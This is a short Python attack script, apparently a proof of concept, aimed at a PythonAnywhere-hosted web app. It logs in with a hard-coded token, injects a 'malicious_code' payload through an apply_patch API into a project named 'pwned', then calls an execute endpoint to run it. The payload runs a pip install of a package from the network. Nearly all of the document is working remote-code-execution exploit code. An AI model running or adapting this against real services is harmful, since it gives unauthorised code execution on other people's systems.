import requests

s = requests.Session()
s.post('https://mikeymike.pythonanywhere.com/login', data={'token': 'Mike'})

malicious_code = """
import os
print("Installing agy...")
os.system("pip3 install --user google-antigravity")
print("Done!")
"""

print("Injecting payload...")
s.post('https://mikeymike.pythonanywhere.com/api/projects/surgery_logic/apply_patch', json={
    "project": "pwned",
    "file": "main.py",
    "code": malicious_code
})

print("Executing pwned...")
r2 = s.get('https://mikeymike.pythonanywhere.com/api/projects/execute/pwned')
print(r2.status_code, r2.text)

